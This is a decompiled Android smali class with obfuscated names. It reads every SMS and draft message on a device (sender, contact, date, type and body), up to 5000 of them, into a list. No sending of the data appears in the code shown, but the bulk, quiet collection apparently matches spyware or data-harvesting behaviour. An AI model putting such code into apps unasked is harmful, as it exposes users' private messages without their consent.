.class public Lsysda/d/ao;
.super Ljava/lang/Object;


# direct methods
.method public static a(Ljava/util/ArrayList;)I
    .locals 9

    const/4 v4, 0x4

    const/4 v3, 0x2

    const/4 v1, 0x1

    const/4 v6, 0x0

    if-nez p0, :cond_0

    const/16 v0, 0x64

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x5

    new-array v2, v0, [Ljava/lang/String;

    const-string v0, "address"

    aput-object v0, v2, v6

    const-string v0, "person"

    aput-object v0, v2, v1

    const-string v0, "date"

    aput-object v0, v2, v3

    const/4 v0, 0x3

    const-string v1, "type"

    aput-object v1, v2, v0

    const-string v0, "body"

    aput-object v0, v2, v4

    :try_start_0
    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Application;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-string v5, "date ASC"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    if-nez v1, :cond_1

    const/16 v0, 0x64

    goto :goto_0

    :cond_1
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v3

    invoke-virtual {p0, v3}, Ljava/util/ArrayList;->ensureCapacity(I)V

    :cond_2
    invoke-static {}, Lsysda/g;->a()Z

    move-result v3

    if-eqz v3, :cond_4

    :cond_3
    :goto_1
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    invoke-virtual {p0}, Ljava/util/ArrayList;->size()I

    move-result v1

    const/16 v3, 0x1388

    if-lt v1, v3, :cond_9

    move v0, v6

    goto :goto_0

    :cond_4
    new-instance v3, Lsysda/d/ap;

    invoke-direct {v3}, Lsysda/d/ap;-><init>()V

    const/4 v4, 0x0

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_7

    const/4 v4, 0x0

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_7

    const/4 v4, 0x0

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    const-string v5, "(^[0-9#\\+\\*\\(\\)\\-\\s\\.,]+$)"

    invoke-virtual {v4, v5}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_6

    const/4 v4, 0x0

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    const-string v5, "([^0-9#\\*\\+]+)"

    const-string v7, ""

    invoke-virtual {v4, v5, v7}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lsysda/d/ap;->c:Ljava/lang/String;

    :goto_2
    new-instance v4, Ljava/util/Date;

    const/4 v5, 0x2

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    invoke-direct {v4, v7, v8}, Ljava/util/Date;-><init>(J)V

    iput-object v4, v3, Lsysda/d/ap;->b:Ljava/util/Date;

    const/4 v4, 0x3

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    packed-switch v4, :pswitch_data_0

    const/16 v4, 0xff

    iput v4, v3, Lsysda/d/ap;->a:I

    :goto_3
    const/4 v4, 0x4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_8

    const/4 v4, 0x4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lsysda/d/ap;->d:Ljava/lang/String;

    :goto_4
    invoke-virtual {p0, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-virtual {p0}, Ljava/util/ArrayList;->size()I

    move-result v3

    const/16 v4, 0x1388

    if-ge v3, v4, :cond_3

    :cond_5
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_2

    goto :goto_1

    :cond_6
    const/4 v4, 0x0

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lsysda/d/ap;->c:Ljava/lang/String;

    goto :goto_2

    :catch_0
    move-exception v0

    const/16 v0, 0x64

    goto/16 :goto_0

    :cond_7
    const/4 v4, 0x1

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_5

    const/4 v4, 0x1

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_5

    const/4 v4, 0x1

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lsysda/d/ap;->c:Ljava/lang/String;

    goto :goto_2

    :pswitch_0
    const/4 v4, 0x0

    iput v4, v3, Lsysda/d/ap;->a:I

    goto :goto_3

    :pswitch_1
    const/4 v4, 0x3

    iput v4, v3, Lsysda/d/ap;->a:I

    goto :goto_3

    :pswitch_2
    const/4 v4, 0x2

    iput v4, v3, Lsysda/d/ap;->a:I

    goto :goto_3

    :cond_8
    const-string v4, ""

    iput-object v4, v3, Lsysda/d/ap;->d:Ljava/lang/String;

    goto :goto_4

    :cond_9
    const-string v1, "content://sms/draft"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-string v5, "date ASC"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    if-nez v0, :cond_a

    move v0, v6

    goto/16 :goto_0

    :cond_a
    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_c

    invoke-virtual {p0}, Ljava/util/ArrayList;->size()I

    move-result v1

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v2

    add-int/2addr v1, v2

    invoke-virtual {p0, v1}, Ljava/util/ArrayList;->ensureCapacity(I)V

    :cond_b
    invoke-static {}, Lsysda/g;->a()Z

    move-result v1

    if-eqz v1, :cond_d

    :cond_c
    :goto_5
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    move v0, v6

    goto/16 :goto_0

    :cond_d
    new-instance v1, Lsysda/d/ap;

    invoke-direct {v1}, Lsysda/d/ap;-><init>()V

    const/4 v2, 0x0

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_10

    const/4 v2, 0x0

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_10

    const/4 v2, 0x0

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    const-string v3, "(^[0-9#\\+\\*\\(\\)\\-\\s\\.,]+$)"

    invoke-virtual {v2, v3}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_f

    const/4 v2, 0x0

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    const-string v3, "([^0-9#\\*\\+]+)"

    const-string v4, ""

    invoke-virtual {v2, v3, v4}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lsysda/d/ap;->c:Ljava/lang/String;

    :goto_6
    new-instance v2, Ljava/util/Date;

    const/4 v3, 0x2

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v3

    invoke-direct {v2, v3, v4}, Ljava/util/Date;-><init>(J)V

    iput-object v2, v1, Lsysda/d/ap;->b:Ljava/util/Date;

    const/4 v2, 0x2

    iput v2, v1, Lsysda/d/ap;->a:I

    const/4 v2, 0x4

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_11

    const/4 v2, 0x4

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lsysda/d/ap;->d:Ljava/lang/String;

    :goto_7
    invoke-virtual {p0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-virtual {p0}, Ljava/util/ArrayList;->size()I

    move-result v1

    const/16 v2, 0x1388

    if-ge v1, v2, :cond_c

    :cond_e
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_b

    goto :goto_5

    :cond_f
    const/4 v2, 0x0

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lsysda/d/ap;->c:Ljava/lang/String;

    goto :goto_6

    :cond_10
    const/4 v2, 0x1

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_e

    const/4 v2, 0x1

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_e

    const/4 v2, 0x1

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lsysda/d/ap;->c:Ljava/lang/String;

    goto :goto_6

    :cond_11
    const-string v2, ""

    iput-object v2, v1, Lsysda/d/ap;->d:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_7

    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method
